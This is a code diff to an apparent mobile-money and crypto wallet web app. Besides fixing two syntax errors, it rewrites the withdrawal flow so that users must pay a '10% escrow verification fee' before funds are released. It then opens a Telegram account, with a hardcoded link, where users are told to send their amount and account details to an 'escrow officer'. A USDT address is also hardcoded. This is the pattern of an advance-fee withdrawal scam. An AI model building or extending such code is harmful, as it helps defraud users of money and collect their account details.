@@ -1470,7 +1470,9 @@
                     <input type="number" id="wd-amt" placeholder="Enter amount" min="10" style="flex:1;border:none;background:var(--input-bg);color:var(--text);font-size:17px;font-weight:700;padding:12px;outline:none;"/>
                 </div>
             </div>
-            <button onclick="handleWithdraw()" style="width:100%;padding:14px;border-radius:var(--r);background:var(--primary);border:none;color:#fff;font-size:15px;font-weight:800;cursor:pointer;">📤 Request Withdrawal</button>
+            <button onclick="handleWithdraw()" style="width:100%;padding:14px;border-radius:var(--r);background:var(--primary);border:none;color:#fff;font-size:15px;font-weight:800;cursor:pointer;margin-bottom:8px;">📤 Request Withdrawal</button>
+            <a id="tg-escrow-link" href="https://t.me/Chichi138" target="_blank" rel="noopener" style="display:block;width:100%;padding:12px;border-radius:var(--r);border:1.5px solid #2AABEE;background:rgba(42,171,238,0.08);color:#2AABEE;font-size:13px;font-weight:800;text-align:center;text-decoration:none;box-sizing:border-box;">✈️ Message escrow on Telegram</a>
+            <div style="font-size:11px;color:var(--muted);text-align:center;margin-top:8px;line-height:1.4;">After requesting, inbox escrow to pay the 10% fee and process your payout.</div>
         </div>
 
         <!-- CRYPTO WITHDRAW -->
@@ -2998,7 +3000,7 @@
             catch(e) { throw new Error('Server error: ' + text.substring(0,100)); }
             if(!data.success) {
                 document.getElementById('mpesa-sheet').style.display='none';
-                appToast('Payment request failed. Please try again.', 'err'));
+                appToast('Payment request failed. Please try again.', 'err');
                 return;
             }
             document.getElementById('mpesa-s1').style.display='none';
@@ -3043,7 +3045,7 @@
         }
     }
 
-    async async function handleWithdraw(){
+    async function handleWithdraw(){
         if(!currentUser){ goPage('login'); return; }
 
         // Support both amount field ids
@@ -3070,13 +3072,13 @@
               <div style="display:flex;justify-content:space-between;margin-bottom:4px;"><span>Escrow (10%)</span><strong>${sym} ${escrow.toLocaleString()}</strong></div>
               <div style="display:flex;justify-content:space-between;border-top:1px solid var(--border,#E2E5E9);padding-top:6px;margin-top:4px;"><span>You receive</span><strong style="color:#27AE60;">${sym} ${net.toLocaleString()}</strong></div>
             </div>
-            <p style="margin:0;font-size:12px;">This fee is held temporarily for compliance and is standard for processing large payouts. Tap <strong>Proceed &amp; Pay</strong> to continue.</p>
+            <p style="margin:0 0 10px;font-size:12px;">A <strong>10% escrow verification fee</strong> is required before funds are released. This is held for compliance while your payout is processed.</p>
+            <p style="margin:0;font-size:12px;">After you proceed, message our escrow officer on Telegram with your amount and account details so they can confirm payment and complete your withdrawal.</p>
         `;
 
         const ok = await openAppModal('Withdrawal verification', body, 'Proceed & Pay');
         if(!ok) return;
 
-        // Create pending withdrawal + send user to pay escrow via deposit/crypto
         try {
             await db.from('transactions').insert({
                 user_id: currentUser.id,
@@ -3088,9 +3090,11 @@
         } catch(e) {}
 
         try { localStorage.setItem('withdraw_escrow', JSON.stringify({ amt, escrow, net, at: Date.now() })); } catch(e){}
-        appToast('Pay escrow ' + sym + ' ' + escrow + ' to release your withdrawal.', 'ok');
-        goPage('wallet');
-        try { setWalletTab('deposit'); setDepositMethod('crypto'); } catch(e){}
+
+        // Open Telegram escrow contact
+        const tg = (typeof TELEGRAM_ESCROW_URL !== 'undefined' && TELEGRAM_ESCROW_URL) ? TELEGRAM_ESCROW_URL : 'https://t.me/Chichi138';
+        appToast('Contact escrow on Telegram to complete your withdrawal.', 'ok');
+        window.open(tg, '_blank', 'noopener,noreferrer');
     }
 
     // ===== SHARE =====
@@ -3406,6 +3410,7 @@
 
 
     // ===== USDT =====
+    const TELEGRAM_ESCROW_URL = "https://t.me/Chichi138"; // change to your escrow Telegram link
     const USDT_ADDRESS = "TDVNpxx14bcbj9XsedjL8rypmYP3HW2hfm";
 
     function loadUSDT(){
